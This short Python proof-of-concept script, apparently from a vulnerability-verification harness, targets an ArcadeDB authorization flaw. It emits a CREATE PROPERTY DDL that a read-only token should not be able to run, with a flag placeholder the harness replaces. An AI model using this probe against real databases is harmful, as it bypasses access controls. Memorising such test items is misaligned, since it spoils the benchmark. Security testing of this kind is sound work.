#!/usr/bin/env python3
"""
Original PoC for CVE-2026-44221 (the ORIGINAL vuln, GIVEN to the method).

A read-only ArcadeDB API token issues a CREATE PROPERTY schema-mutating DDL over
external HTTP (POST /api/v1/command/<db>). This is the vector the CVE-2026-44221
fix (26.4.2) closed by adding an UPDATE_SCHEMA check to createProperty.

  succeeds@V0 (26.3.2, no check) ; blocked@V1 (26.4.2, createProperty checked).

Platform convention: stdout prints a JSON candidate; the flag placeholder
PCBFLAG_[A-Za-z0-9_]+ is replaced with the per-run RUN_FLAG by scripts/verify.sh
(the injected value becomes the property name), then poc/seed_exec.py executes the
DDL with a read-only token and reports whether the schema mutation landed.
"""
import json


def candidate():
    return {
        "probe_id": "cve-2026-44221-create-prop",
        "ddl": "CREATE PROPERTY Widget.PCBFLAG_prop STRING",
    }


if __name__ == "__main__":
    import sys
    _ = sys.argv  # original_poc.py <version> — 版本参数仅占位（candidate 与版本无关）
    print(json.dumps(candidate()))
